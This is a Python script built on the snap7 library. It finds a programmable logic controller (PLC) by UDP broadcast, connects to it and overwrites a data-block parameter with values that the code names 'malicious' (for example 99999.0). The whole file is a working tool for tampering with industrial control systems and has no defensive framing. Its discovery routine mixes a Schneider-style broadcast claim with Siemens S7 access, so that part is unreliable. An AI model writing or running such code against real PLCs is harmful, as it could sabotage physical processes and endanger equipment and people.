import snap7
import socket
import struct
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Define PLC connection parameters.  These could be read from a config file.
PLC_IP = None  # Initially unknown
PLC_RACK = 0
PLC_SLOT = 1
DB_NUMBER = 1  # Example DB number (modify as needed)
PARAMETER_ADDRESS = 0  # Example offset in the DB (modify as needed, in bytes)
PARAMETER_DATATYPE = 'REAL'  # Example data type.  Choose from: 'REAL', 'INT', 'DINT', 'BOOL'
MALICIOUS_VALUE_REAL = 99999.0 # Example malicious value.
MALICIOUS_VALUE_INT = 9999
MALICIOUS_VALUE_DINT = 99999999
MALICIOUS_VALUE_BOOL = True

def find_plc_ip():
    """
    Attempts to discover the PLC's IP address via broadcast.
    This is a basic method and might not work in all network configurations.
    It relies on the PLC responding to a basic discovery request.
    """
    global PLC_IP  # modify the global variable

    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    sock.settimeout(5)  # Set a timeout of 5 seconds

    # Craft a simple discovery message (can be anything, but Schneider PLCs often respond to simple messages)
    message = b"GET_IP"

    # Send the message to the broadcast address
    sock.sendto(message, ('<broadcast>', 2222))  # Port 2222 is a common discovery port. Adapt if needed

    logging.info("Sending broadcast discovery message...")

    try:
        # Receive the response
        data, addr = sock.recvfrom(1024)
        PLC_IP = addr[0]
        logging.info(f"PLC IP address found: {PLC_IP}")

    except socket.timeout:
        logging.warning("No response received from PLC within the timeout period.")
        PLC_IP = None  # Reset to None if no IP found

    except Exception as e:
        logging.error(f"Error during PLC IP discovery: {e}")
        PLC_IP = None  # Reset to None if error occurred

    finally:
        sock.close()  # Close the socket

    if PLC_IP is None:
        logging.error("Failed to discover PLC IP address.  Please manually set PLC_IP in the script.")
        return False

    return True

def write_real(plc, db_number, address, value):
    """Writes a REAL (float) value to a specified DB and address."""
    try:
        data = bytearray(struct.pack(">f", value))  # ">f" for big-endian float
        plc.db_write(db_number, address, data)
        logging.info(f"Successfully wrote REAL value {value} to DB{db_number} at address {address}")
    except Exception as e:
        logging.error(f"Error writing REAL to DB{db_number} at address {address}: {e}")
        raise

def write_int(plc, db_number, address, value):
    """Writes an INT (integer) value to a specified DB and address."""
    try:
        data = bytearray(struct.pack(">h", value))  # ">h" for big-endian short (2 bytes)
        plc.db_write(db_number, address, data)
        logging.info(f"Successfully wrote INT value {value} to DB{db_number} at address {address}")
    except Exception as e:
        logging.error(f"Error writing INT to DB{db_number} at address {address}: {e}")
        raise

def write_dint(plc, db_number, address, value):
    """Writes a DINT (double integer) value to a specified DB and address."""
    try:
        data = bytearray(struct.pack(">i", value))  # ">i" for big-endian integer (4 bytes)
        plc.db_write(db_number, address, data)
        logging.info(f"Successfully wrote DINT value {value} to DB{db_number} at address {address}")
    except Exception as e:
        logging.error(f"Error writing DINT to DB{db_number} at address {address}: {e}")
        raise

def write_bool(plc, db_number, address, value):
    """Writes a BOOL (boolean) value to a specified DB and address."""
    try:
        # BOOLs are single bits, but S7 often uses entire bytes.
        data = bytearray([1 if value else 0])  # 1 for True, 0 for False
        plc.db_write(db_number, address, data)
        logging.info(f"Successfully wrote BOOL value {value} to DB{db_number} at address {address}")
    except Exception as e:
        logging.error(f"Error writing BOOL to DB{db_number} at address {address}: {e}")
        raise

def modify_parameter(plc, db_number, address, data_type, malicious_value):
    """Modifies a parameter in the PLC's DB."""
    try:
        if data_type == 'REAL':
            write_real(plc, db_number, address, malicious_value)
        elif data_type == 'INT':
            write_int(plc, db_number, address, malicious_value)
        elif data_type == 'DINT':
            write_dint(plc, db_number, address, malicious_value)
        elif data_type == 'BOOL':
            write_bool(plc, db_number, address, malicious_value)
        else:
            raise ValueError("Unsupported data type: {}".format(data_type))

    except Exception as e:
        logging.error(f"Failed to modify parameter: {e}")
        raise

def main():
    global PLC_IP

    # Attempt to discover the PLC IP address
    if not find_plc_ip():
        print("PLC IP not found. Exiting.")
        return

    # Check if the PLC IP was discovered or set manually
    if not PLC_IP:
        print("PLC_IP is not defined.  Please set it manually in the script.")
        return

    # Initialize the Snap7 client
    plc = snap7.client.Client()

    try:
        # Connect to the PLC
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        logging.info(f"Connected to PLC at {PLC_IP}:{PLC_RACK}:{PLC_SLOT}")

        # Select the malicious value based on the data type
        if PARAMETER_DATATYPE == 'REAL':
            malicious_value = MALICIOUS_VALUE_REAL
        elif PARAMETER_DATATYPE == 'INT':
            malicious_value = MALICIOUS_VALUE_INT
        elif PARAMETER_DATATYPE == 'DINT':
            malicious_value = MALICIOUS_VALUE_DINT
        elif PARAMETER_DATATYPE == 'BOOL':
            malicious_value = MALICIOUS_VALUE_BOOL
        else:
            raise ValueError("Unsupported data type: {}".format(PARAMETER_DATATYPE))

        # Modify the parameter
        modify_parameter(plc, DB_NUMBER, PARAMETER_ADDRESS, PARAMETER_DATATYPE, malicious_value)

        logging.info("Parameter modification complete.")

    except Exception as e:
        logging.error(f"An error occurred: {e}")

    finally:
        # Disconnect from the PLC
        if plc.get_connected():  # Check if the PLC is connected before disconnecting
            plc.disconnect()
            logging.info("Disconnected from PLC.")

if __name__ == "__main__":
    main()